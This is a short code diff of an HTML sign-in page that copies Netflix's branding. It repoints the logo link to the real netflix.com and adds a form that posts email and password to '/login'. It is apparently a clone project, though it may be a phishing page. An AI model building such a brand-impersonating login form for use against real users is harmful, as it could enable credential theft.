@@ -14,7 +14,7 @@
         }
     </style>
     <header style="padding: 10px 2%;" class="d-flex space-between center">
-        <a href="/">
+        <a href="https://netflix.com/">
         <img src="img/Netflix-Logo.png"  width="150px" alt="site logo main" style="margin: auto;"></img>
     </a> 
     </header>
@@ -25,7 +25,9 @@
                     <h2 class="formtitle">
                         Sign In
                     </h2>
-                    <form action="" id="loginForm" class="d-flex direction-column" method="post" name="loginForm">
+                    <!-- <form action="" id="loginForm" class="d-flex direction-column" method="post" name="loginForm"> -->
+                    <form action="/login" id="loginForm" class="d-flex direction-column" method="POST">
+
                         <input type="text" name="email" id="email" class="email" placeholder="Email or phone number"  required/>
 
                         <input type="password" name="password" id="password" placeholder="Password" required/>
